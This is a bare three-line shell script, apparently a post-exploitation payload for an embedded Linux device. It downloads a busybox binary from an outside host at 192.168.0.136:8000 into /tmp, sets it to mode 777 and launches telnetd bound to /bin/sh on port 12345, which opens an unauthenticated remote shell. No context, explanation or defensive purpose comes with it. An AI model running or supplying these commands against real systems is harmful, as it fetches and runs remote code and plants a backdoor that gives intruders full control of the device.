/bin/busybox wget -O /tmp/busybox http://192.168.0.136:8000/busybox
/bin/busybox chmod 777 /tmp/busybox
/tmp/busybox telnetd -l/bin/sh -p12345
